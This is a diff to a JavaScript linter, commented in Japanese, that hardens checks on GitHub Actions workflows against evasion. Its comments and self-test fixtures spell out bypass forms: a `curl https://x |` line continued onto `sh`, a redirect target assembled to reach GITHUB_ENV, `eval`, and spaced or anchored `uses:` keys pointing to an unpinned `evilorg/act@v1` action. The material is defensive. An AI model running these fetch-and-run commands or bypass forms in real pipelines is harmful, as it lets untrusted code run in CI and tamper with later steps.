@@ -300,6 +300,12 @@ function runBodyProblem(line) {
   ) {
     return '遠隔のコードを取得してそのまま実行している (curl | sh の形)';
   }
+  // 2026-10-21 (パス 545 · T-160): 名前を組み立てて GITHUB_ENV へ書く (`F=GITHUB_E; >> "${F}NV"`) と上の綴りの
+  // 規則は素通りする。リダイレクト先が変数の合成・コマンド置換・`eval` の行は、行き先を読めないので断る。
+  // (`>> "$GITHUB_OUTPUT"` / `"$GITHUB_STEP_SUMMARY"` のような単独の変数は通す)
+  if (/>>?\s*["']?[^\s"']*(?:\$\{\w+\}\w|\$\(|`)/.test(line) || /(?:^|[\s;&|])eval\b/.test(line)) {
+    return 'リダイレクト先を組み立てている・eval している — 書き込み先 (GITHUB_ENV など) が静的に読めない';
+  }
   if (/\bGITHUB_(?:ENV|PATH)\b/.test(line)) {
     return 'GITHUB_ENV / GITHUB_PATH へ書いている — 後続のステップの環境・PATH を書き換えられる';
   }
@@ -361,6 +367,19 @@ function structureProblems(name, text) {
     }
     if (/^\s*-?\s*["'](uses|run|script|shell|if|env|with|permissions|continue-on-error|working-directory|persist-credentials)["']\s*:/.test(line)) {
       out.push({ file: at, why: '引用符つきの鍵は行単位の規則が読めない — 引用符なしの鍵で書くこと' });
+    }
+    // 2026-10-21 (パス 545 · threat: T-160): js-yaml が同じ step と読む書き方のうち、行頭の `uses:` を
+    // 見る規則に映らない物。実測 —— 未固定の第三者 action が exit 0 で通った 3 形:
+    //   ① `uses : evil/act@v1` (鍵と : の間の空白) ② `uses:` の値を次の行へ送る ③ `- &a uses: …` (アンカー)。
+    // どれも**読めない形は落とす**側 (実物に 0 件)。
+    if (/^\s*(?:-\s*)?["']?(?:uses|run|script|shell|if|env|with|permissions)["']?\s+:/.test(line)) {
+      out.push({ file: at, why: '鍵と : の間に空白がある書き方は行単位の規則が読めない — `key:` と詰めて書くこと (読めない形は落とす)' });
+    }
+    if (/^\s*(?:-\s*)?uses:\s*$/.test(line)) {
+      out.push({ file: at, why: '`uses:` の値を次の行へ送る書き方は行単位の規則が読めない — 同じ行に書くこと (読めない形は落とす)' });
+    }
+    if (/^\s*-\s*[&*!]\S/.test(line) || /^\s*(?:-\s*)?[\w-]+:\s+[&*!][!\w-]/.test(line) || /^\s*(?:-\s*)?<<\s*:/.test(line)) {
+      out.push({ file: at, why: 'YAML のアンカー・エイリアス・タグ・マージキー (& * ! <<) は行単位の規則が読めない — 展開して書くこと (読めない形は落とす)' });
     }
     if (GATE_WORKFLOWS.has(name) && GATE_NEUTERING_KEYS.test(line)) {
       const key = GATE_NEUTERING_KEYS.exec(line)[1];
@@ -559,7 +578,18 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
         why: `job の container:/services: のイメージがダイジェストで固定されていません (${c.ref}) — \`@sha256:<64 桁>\` にすること`,
       });
     }
-    for (const [ln, line] of runBlockLines(text)) {
+    // `curl … |` の次の行に `sh` が続く形も 1 本のシェル行 (トレイリングの `|` `\\` `&&` `||` は行をまたぐ)。
+    const runLines = runBlockLines(text);
+    const joinedBodies = new Map(); // 開始行 → 継続を畳んだ 1 本の行
+    for (let k = 0; k < runLines.length; k++) {
+      let [ln0, acc] = runLines[k];
+      while (!/^\s*-?\s*run:\s*[|>][+-]?\s*$/.test(acc) && /(?:\||\\|&&)\s*$/.test(acc) && k + 1 < runLines.length && runLines[k + 1][0] === runLines[k][0] + 1) {
+        k += 1;
+        acc = acc.replace(/\\\s*$/, ' ') + ' ' + runLines[k][1].trim();
+      }
+      joinedBodies.set(ln0, acc);
+    }
+    for (const [ln, line] of runLines) {
       if (UNTRUSTED_CONTEXT.test(line.replace(SAFE_CONTEXT, ''))) {
         problems.push({
           file: `${name}:${ln}`,
@@ -575,7 +605,7 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
       }
       // 内容そのものの危険 (パス 530)。シェルの注記の行は読まない。
       if (!/^\s*#/.test(line)) {
-        const body = runBodyProblem(line);
+        const body = runBodyProblem(line) ?? (joinedBodies.has(ln) && joinedBodies.get(ln) !== line ? runBodyProblem(joinedBodies.get(ln)) : null);
         // ローダ環境変数は上の全行走査が同じ行を報告済み —— 二重に鳴らさない。
         if (body && !loaderEnvProblem(line)) {
           problems.push({ file: `${name}:${ln}`, why: `run: — ${body} — ${line.trim().slice(0, 80)}` });
@@ -636,6 +666,12 @@ function selfTest() {
     ['ci.yml の step に if: を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: npm run lint:malware\n        if: github.event_name != 'pull_request'\n` }], 1],
     ['ci.yml の pull_request に paths-ignore を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\non:\n  pull_request:\n    paths-ignore: ['scripts/**']\n` }], 1],
     ['release.yml の job の if: は落とさない (ゲートの workflow ではない)', [{ name: 'release.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - run: echo\n` }], 0],
+    ['uses : (鍵と : の間の空白) を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses : evilorg/act@v1\n' }], 1],
+    ['uses: の値を次の行へ送る書き方を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses:\n          evilorg/act@v1\n' }], 1],
+    ['アンカー付きの step を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - &a uses: evilorg/act@v1\n' }], 1],
+    ['curl の次の行に sh が続く形を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: |\n          curl https://x |\n            sh\n' }], 1],
+    ['書き込み先を組み立てる GITHUB_ENV を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: |\n          echo "A=b" >> "${F}NV"\n' }], 1],
+    ['対照: 単独の $GITHUB_OUTPUT への追記は落とさない (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: |\n          echo "k=v" >> "$GITHUB_OUTPUT"\n' }], 0],
     ['注記の中のフロー記法は落とさない', [{ name: 'x.yml', text: `permissions:\n  contents: read\n# - {uses: x@v1} は書かない\njobs:\n  a:\n    steps:\n      - run: echo\n` }], 0],
     ['permissions があれば通す', [{ name: 'x.yml', text: 'name: x\npermissions:\n  contents: read\n' }], 0],
     [
